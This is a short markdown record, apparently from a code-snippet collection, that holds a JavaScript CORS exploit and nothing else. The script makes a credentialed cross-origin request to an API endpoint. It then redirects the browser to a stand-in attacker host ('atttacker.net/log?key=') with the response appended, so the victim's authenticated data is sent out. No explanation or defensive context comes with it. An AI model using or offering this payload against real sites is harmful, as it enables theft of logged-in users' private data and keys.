---
id: d2f1f0cd-3b7e-4407-b27f-b8caf058e8d0
type: code
language: js
verified: false
created_at: '2023-04-06T03:55:55.920996+00:00'
updated_at: '2023-04-10T20:21:22.987270+00:00'
---

# Code Snippet d2f1f0cd

**Language**: js

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```
